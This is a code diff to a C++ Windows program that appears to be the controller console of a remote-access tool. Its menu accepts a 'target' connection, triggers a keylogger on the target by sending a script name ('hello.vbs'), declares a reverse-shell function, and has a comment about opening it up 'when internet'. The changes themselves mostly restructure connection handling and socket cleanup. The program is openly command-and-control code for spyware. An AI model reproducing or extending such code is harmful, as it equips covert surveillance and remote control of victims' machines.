@@ -25,6 +25,7 @@ char os;
 ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 int socket_setup();
 string get_client_ip(SOCKET clientSocket);
+void safe_closesocket(SOCKET& s);
 
 void send_data(SOCKET clientSocket, const string &data);
 void send_data(SOCKET clientSocket, int data);
@@ -36,15 +37,6 @@ int Get_menu_option();
 
 int Rev_Shell();
 ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-
-void safe_closesocket(SOCKET& s) 
-{
-    if (s != INVALID_SOCKET) {
-        shutdown(s, SD_BOTH); // Prevent further sends/receives
-        closesocket(s);
-        s = INVALID_SOCKET; // Set to INVALID_SOCKET to prevent double closing
-    }
-}
 
 int main(int argc, char *argv[]) 
 {
@@ -60,28 +52,39 @@ int main(int argc, char *argv[])
         {
             case 1:                                                                         //connect
             {   
-                if (listen(listenSocket, SOMAXCONN) == SOCKET_ERROR)
-                {
-                    std::cerr << "listen failed with error: " << WSAGetLastError() << std::endl;
-                    safe_closesocket(listenSocket); // Use safe_closesocket here
-                    WSACleanup();
-                    return 1;
-                }               
+                if(!targetconnected)
+                {    
+                    if (listen(listenSocket, SOMAXCONN) == SOCKET_ERROR)
+                    {
+                        std::cerr << "listen failed with error: " << WSAGetLastError() << std::endl;
+                        safe_closesocket(listenSocket);
+                        WSACleanup();
+                        
+                        return 1;
+                    }               
+                    cout << "\n>> Waiting for incoming connections..." << endl;
 
-                cout << "\n>> Waiting for incoming connections..." << endl;
-                clientSocket = accept(listenSocket, nullptr, nullptr);
-                
-                if(get_client_ip(clientSocket) == "127.0.0.1")
-                {   
-                    cout << ">> " << get_client_ip(clientSocket) << " connected." << endl;
-                    targetconnected = true;
+    /////////////////////////////////////////////////////change this when internet////////////////////////////////////////////////
+    // can make if(checkip) and do something....
+                    clientSocket = accept(listenSocket, nullptr, nullptr);                
+                    if(get_client_ip(clientSocket) == "127.0.0.1")
+                    {   
+                        cout << ">> " << get_client_ip(clientSocket) << " connected." << endl;
+                        targetconnected = true;
+                    }
+                    else 
+                    {
+                        cout << ">> " << get_client_ip(clientSocket) << " Not allowed to connect." << endl;
+                        closesocket(clientSocket);
+                    }
                 }
-                else 
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+                else
                 {
-                    cout << ">> " << get_client_ip(clientSocket) << " Not allowed to connect." << endl;
-                    closesocket(clientSocket);
+                    cout << ">> Already connected to a target." << endl;
+                    system("pause");                    
                 }
-                system("pause");
+
                 break;
             }
             
@@ -91,7 +94,8 @@ int main(int argc, char *argv[])
                 {
                     send_data(clientSocket, 2);
                     cout << ">> Sent " << endl;
-                } else
+                } 
+                else
                 {
                     cout << ">> Target not connected or socket invalid!!" << endl;
                     system("pause");
@@ -104,64 +108,71 @@ int main(int argc, char *argv[])
             
             case 3:                                                                     //Execute keylogger
             {
-                if (targetconnected && clientSocket != INVALID_SOCKET) { // VERY IMPORTANT CHECK
+                if (targetconnected && clientSocket != INVALID_SOCKET)
+                {
                     send_data(clientSocket, 3);
                     send_data(clientSocket, "hello.vbs");
+
                     cout << ">> Sent " << endl;
-                } else {
-                    cout << ">> Target not connected or socket invalid!!" << endl;
                 }
+                else cout << ">> Target not connected or socket invalid!!" << endl;
                 system("pause");
+
                 break;
             }
             case 99:                                                                    //DC Current target
             {
-                if (targetconnected) {
-                    send_data(clientSocket, 99); // Inform the client (important!)
+                if (targetconnected)
+                {
+                    send_data(clientSocket, 99);
                     safe_closesocket(clientSocket);
                     safe_closesocket(listenSocket);
                     targetconnected = false;
 
-                    if (socket_setup() != 0) {
-                    return 1; // Handle socket setup error
-                    }
-
+                    if (socket_setup() != 0) return 1;
                     cout << ">> Disconnecting client..." << endl << endl;
                 } 
-                else 
-                {
-                    cout << ">> No client connected to disconnect." << endl;
-                }
+                else cout << ">> No client connected to disconnect." << endl;
                 system("pause");
+                
                 break;
             }
             case 11:                                                                    //DC Current target and stop its code execution
             {
-                if (targetconnected) {
-                    send_data(clientSocket, 11); // Inform the client (important!)
+                if (targetconnected)
+                {
+                    send_data(clientSocket, 11);
                     safe_closesocket(clientSocket);
                     targetconnected = false;
+                    
                     cout << ">> Disconnecting client and requesting stop..." << endl << endl;
-                } else {
-                    cout << ">> No client connected to disconnect." << endl;
-                }
+                } 
+                else cout << ">> No client connected to disconnect." << endl;
                 system("pause");
+
                 break;
             }
             case 0:                                                                     //Exit console
             {
-                //send_data(clientSocket,99);
-                safe_closesocket(clientSocket);
-                safe_closesocket(listenSocket);
 
-                WSACleanup();
-                cout << ">> Exiting..." << endl << endl;
-                loop = false;
+                if(!targetconnected)
+                {
+                    safe_closesocket(clientSocket);
+                    safe_closesocket(listenSocket);
+
+                    WSACleanup();
+                    cout << ">> Exiting..." << endl << endl;
+                    loop = false;
+                }
+                else
+                {
+                    cout << ">> Target not disconnected!!" << endl;
+                    system("pause");
+                }
                 break;
             }
             default:
             {
-
                 cout << ">> Invalid option ( -_- )" << endl << endl;
                 system("pause");
                 break;
@@ -410,4 +421,13 @@ string get_client_ip(SOCKET clientSocket)
     char clientIP[INET_ADDRSTRLEN];
     inet_ntop(AF_INET, &clientAddr.sin_addr, clientIP, sizeof(clientIP));
     return string(clientIP);
+}
+
+void safe_closesocket(SOCKET& s) 
+{
+    if (s != INVALID_SOCKET) {
+        shutdown(s, SD_BOTH); // Prevent further sends/receives
+        closesocket(s);
+        s = INVALID_SOCKET; // Set to INVALID_SOCKET to prevent double closing
+    }
 }
